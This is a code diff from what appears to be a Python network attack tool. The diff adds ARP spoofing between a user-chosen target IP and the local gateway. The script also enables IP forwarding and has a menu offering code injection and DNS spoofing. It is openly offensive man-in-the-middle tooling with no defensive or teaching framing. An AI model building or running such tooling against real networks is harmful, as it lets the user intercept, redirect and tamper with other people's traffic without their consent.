@@ -3,15 +3,19 @@ import assets.netscan as scan
 import os
 import threading
 import subprocess
+import arp_spoof as arpspf
 
 
 def target_f():
 	subprocess.call("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'", shell=True)
 	user_inside_target = 0
-	target_ip = raw_input("Target IP>>") 
+	target_ip = raw_input("Target IP>>")
+	router_ip = str(subprocess.check_output("ip route show | grep -i 'default via'| awk '{print $3 }'", shell=True))
 	if target_ip == "":
 		print("Please specify a target.")
 		target_f()
+	start_arp = threading.Thread(target=arpspf.main, args=(target_ip,router_ip))
+
 	while user_inside_target != "back":
 		print("1.Code Injector")
 		print("2.DNS spoofer")
